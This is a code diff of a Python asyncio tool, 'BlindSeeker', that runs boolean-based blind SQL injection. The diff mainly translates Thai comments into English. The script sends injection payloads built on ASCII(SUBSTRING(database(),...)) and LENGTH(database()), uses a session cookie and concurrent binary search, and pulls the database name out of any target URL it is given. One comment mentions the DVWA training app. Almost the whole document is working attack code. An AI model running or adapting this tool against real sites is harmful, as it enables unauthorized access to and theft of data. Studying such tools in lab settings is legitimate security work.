@@ -9,24 +9,24 @@ from typing import Optional, List, Dict
 from urllib.parse import urlparse
 
 # ==========================================
-# 🔧 CONFIGURATION & LOGGING
+# CONFIGURATION & LOGGING
 # ==========================================
-# ตั้งค่า Logging ให้ดูโปร (มี Timestamp, Level)
+# Configure logging with timestamp and log level
 logging.basicConfig(
     level=logging.INFO,
     format="%(asctime)s [%(levelname)s] %(message)s",
     datefmt="%H:%M:%S"
 )
-logger = logging.getLogger("BlindSeekerPro")
+logger = logging.getLogger("BlindSeeker")
 
 # ==========================================
-# 🏗️ DESIGN PATTERN: STRATEGY
+# DESIGN PATTERN: STRATEGY
 # ==========================================
 class InjectionStrategy(ABC):
     """
-    Abstract Base Class (Blueprint) สำหรับ Strategy การเจาะ
-    ทำให้เราสามารถเพิ่ม Logic แบบ Time-based หรือ Error-based ได้ในอนาคต
-    โดยไม่ต้องแก้โค้ดหลัก (Open/Closed Principle)
+    Abstract Base Class (Blueprint) for injection strategies.
+    This allows for easy extension to support other injection types 
+    (e.g., Time-based, Error-based) without modifying the core logic.
     """
     @abstractmethod
     async def is_truthy(self, session: aiohttp.ClientSession, payload: str) -> bool:
@@ -34,36 +34,38 @@ class InjectionStrategy(ABC):
 
 class BooleanBasedStrategy(InjectionStrategy):
     """
-    Implementation สำหรับ Boolean-based SQL Injection
-    เช็ค True/False จากข้อความที่ปรากฏบนหน้าเว็บ
+    Concrete strategy for Boolean-based Blind SQL Injection.
+    Determines truth based on the presence of a specific string in the response.
     """
     def __init__(self, url: str, success_indicator: str):
         self.url = url
         self.success_indicator = success_indicator
 
     async def is_truthy(self, session: aiohttp.ClientSession, payload: str) -> bool:
+        # DVWA requires the 'Submit' parameter to process the request
         params = {'id': payload, 'Submit': 'Submit'}
         try:
             async with session.get(self.url, params=params) as response:
                 text = await response.text()
-                # ถ้าเจอ Success Indicator แสดงว่า Query เป็นจริง
+                # Return True if the success indicator is found in the response body
                 return self.success_indicator in text
         except Exception as e:
             logger.error(f"Request failed: {e}")
             return False
 
 # ==========================================
-# 🧠 CORE ENGINE (ASYNCIO)
+# CORE ENGINE (ASYNCIO)
 # ==========================================
 class BlindSQLExploiter:
     def __init__(self, strategy: InjectionStrategy, cookie_str: str, max_concurrency: int = 20):
         self.strategy = strategy
         self.cookies = self._parse_cookies(cookie_str)
-        # Semaphore คือตัวคุมโซน ไม่ให้ยิง Request ถล่ม Server จนพัง (Rate Limiting)
+        # Semaphore controls the concurrency limit to prevent DoS or WAF blocking
         self.semaphore = asyncio.Semaphore(max_concurrency) 
-        self.results: Dict[int, str] = {} # เก็บผลลัพธ์ {position: char}
+        self.results: Dict[int, str] = {} # Stores extracted characters: {position: char}
 
     def _parse_cookies(self, cookie_str: str) -> Dict[str, str]:
+        """Parses the raw cookie string into a dictionary."""
         cookies = {}
         if not cookie_str:
             return cookies
@@ -75,24 +77,27 @@ class BlindSQLExploiter:
 
     async def _binary_search_char(self, session: aiohttp.ClientSession, position: int):
         """
-        Logic Binary Search แบบ Asynchronous
+        Performs an asynchronous Binary Search to find a character at a specific position.
+        Algorithm Complexity: O(log n) per character.
         """
-        async with self.semaphore: # ขออนุญาตเข้าทำงาน (ถ้าเต็มต้องรอ)
-            low, high = 32, 126
+        async with self.semaphore: # Acquire lock to respect concurrency limit
+            low, high = 32, 126 # Printable ASCII range
             
             while low <= high:
                 mid = (low + high) // 2
+                
+                # Base case: Found the character
                 if low == high:
                     self.results[position] = chr(low)
-                    # print แบบไม่ต้องขึ้นบรรทัดใหม่ เพื่อความสวยงาม
+                    # Print progress in-line
                     sys.stdout.write(f"\r[+] Progress: Found char at pos {position}: {chr(low)}")
                     sys.stdout.flush()
                     return
 
-                # Payload: ASCII(SUBSTRING(database(),pos,1)) > mid
+                # Payload Logic: ASCII(SUBSTRING(database(),pos,1)) > mid
                 payload = f"1' AND ASCII(SUBSTRING(database(),{position},1)) > {mid} #"
                 
-                # เรียกใช้ Strategy ที่เรา Inject เข้ามา (Dependency Injection)
+                # Delegate the truth check to the injected strategy
                 is_true = await self.strategy.is_truthy(session, payload)
 
                 if is_true:
@@ -102,31 +107,31 @@ class BlindSQLExploiter:
 
     async def exploit(self):
         """
-        Main Routine เพื่อเริ่มโจมตี
+        Main execution routine to orchestrate the attack.
         """
-        logger.info("🚀 Engine Started. Initializing Async Session...")
+        logger.info("Engine Started. Initializing Async Session...")
         
         async with aiohttp.ClientSession(cookies=self.cookies) as session:
-            # 1. หาความยาวก่อน (แบบง่ายๆ Linear เพื่อความชัวร์)
-            logger.info("🔍 Determining database length...")
+            # 1. Determine Database Length (Linear check for reliability)
+            logger.info("Determining database length...")
             length = await self._find_length(session)
             if not length:
                 logger.error("❌ Could not determine database length.")
                 return
 
-            logger.info(f"✅ Database length found: {length}")
-            logger.info("💥 Starting parallel extraction...")
+            logger.info(f"Database length found: {length}")
+            logger.info(" Starting parallel extraction...")
 
-            # 2. สร้าง Tasks สำหรับหาตัวอักษรทุกตัวพร้อมกัน
+            # 2. Create extraction tasks for all positions simultaneously
             start_time = time.time()
             tasks = [self._binary_search_char(session, pos) for pos in range(1, length + 1)]
             
-            # 3. รันทุก Tasks พร้อมกัน (Parallel Execution)
+            # 3. Execute all tasks in parallel
             await asyncio.gather(*tasks)
             
             duration = time.time() - start_time
             
-            # 4. สรุปผล
+            # 4. Aggregate and display results
             final_name = "".join([self.results[i] for i in sorted(self.results.keys())])
             print(f"\n\n{'-'*40}")
             print(f"🎉 EXTRACTION COMPLETE")
@@ -136,6 +141,7 @@ class BlindSQLExploiter:
             print(f"⚡ Throughput:     {len(tasks) * 7 / duration:.2f} req/sec (approx)")
 
     async def _find_length(self, session: aiohttp.ClientSession) -> Optional[int]:
+        """Finds the length of the database name using linear search."""
         for i in range(1, 50):
             payload = f"1' AND LENGTH(database()) = {i} #"
             if await self.strategy.is_truthy(session, payload):
@@ -143,25 +149,24 @@ class BlindSQLExploiter:
         return None
 
 # ==========================================
-# 🎮 ENTRY POINT
+# ENTRY POINT
 # ==========================================
 def main():
     parser = argparse.ArgumentParser(description="BlindSeeker Pro - Enterprise Grade SQLi Tool")
     parser.add_argument("-u", "--url", required=True, help="Target URL")
-    parser.add_argument("-c", "--cookie", required=True, help="Session Cookie")
+    parser.add_argument("-c", "--cookie", required=True, help="Session Cookie String")
     parser.add_argument("-s", "--success", default="User ID exists", help="Success indicator string")
     parser.add_argument("-t", "--concurrency", type=int, default=20, help="Max concurrent requests")
     
     args = parser.parse_args()
 
-    # Setup Strategy (Boolean Based)
-    # ถ้าอนาคตมี TimeBasedStrategy ก็แค่แก้ตรงนี้บรรทัดเดียว
+    # Initialize Strategy (Dependency Injection)
     strategy = BooleanBasedStrategy(args.url, args.success)
     
     # Initialize Engine
     engine = BlindSQLExploiter(strategy, args.cookie, args.concurrency)
     
-    # Run Async Loop
+    # Run the Async Event Loop
     try:
         asyncio.run(engine.exploit())
     except KeyboardInterrupt:
